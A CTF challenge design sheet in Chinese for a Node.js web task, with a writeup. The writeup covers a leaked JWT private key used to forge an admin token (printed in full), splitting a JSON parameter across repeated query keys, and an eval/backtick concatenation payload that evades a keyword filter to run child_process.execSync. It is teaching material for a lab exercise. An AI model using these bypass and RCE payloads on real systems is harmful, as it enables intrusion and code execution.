# CTF赛题设计说明
### [题目信息]：
出题人|出题时间|题目名字|题目类型|难度等级|题目分值
:-|:-|:-|:-|:-|:-
Y4tacker|20210425|NO???|web|3|100

### [题目描述]：
```
打开网站熟悉的页面，熟悉的url可是怎么感觉有点怪呢
```

### [题目考点]：
```
1. 信息泄露(jwt私钥泄露)
2. jwt伪造
3. nodejs传参绕过特性(将json请求格式拆分)
4. 绕过过滤RCE
```

### [是否原创]：
```
是
```

### [Flag]:
```
在env里
```



### [题目环境]：
```
无特殊要求，docker环境里已配置好
```

### [题目writeup]：
首先打开网站发现登录页面，发现可以注册，注册后发现网站源码发现

```
<!--这是啥好东西 /source.php-->
```

下载文件，对nodejs代码审计，发现隐藏路由，但是没有地址，审计后发现应该要读取`/user/1`对应的内容，前提是需要admin身份，从文件当中发现

```javascript
var privateKey = fs.readFileSync(process.cwd()+'//public/private.key');

```

存在私钥泄露，之后我们下载下来本地启动一个环境，生成admin

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MTkyODA3NTJ9.BXkcA79CPaYOI3rgYD46elXvUF1M3a71movZZ5HOpiQOr2zPawssLzwNSYPf8PKoKzWcxTL-lbmsmNSwWGmD1_N1H0jTbREysIIvLHy3Mk4U-gg2H5XfC2DpBXeEOd459EWQVzSLUBXLYfC4QVRegVEx2RChpTnfIj6o23QNCws
```

替换auth参数，之后得到隐藏路由`/gi0e10uF10g`

发现其接收参数判断`status.rce!==undefined&&status.isAdmin===true&&status.isLogin===true`，这种情况下我们只能传入json格式请求，但是会带上逗号，可是过滤了它，我们可以配合上一个trick分开传入

```
?status={"isAdmin":true
&status="isLogin":true
&status="rce":"123"}
```

发现可以rce，但是过滤蛮多的

```
/main|proto|process|require|exec|var|"|:|\[|\]|[0-9]/
```

我们这里可以通过eval嵌套与反引号和加号绕过，当然有其他方法下面给出payload

post传入

```
http://url/gi0e10uF10g
?status={"isAdmin":true
&status="isLogin":true
&status="rce":"eval(`pro`%2b`cess`%2b`.ma`%2b`inModule`%2b`.req`%2b`uire('child_pro`%2b`cess').exe`%2b`cSync('env').toString()`)"}
```

首先`cat /flag`发现说在env里。之后执行`env`获取flag

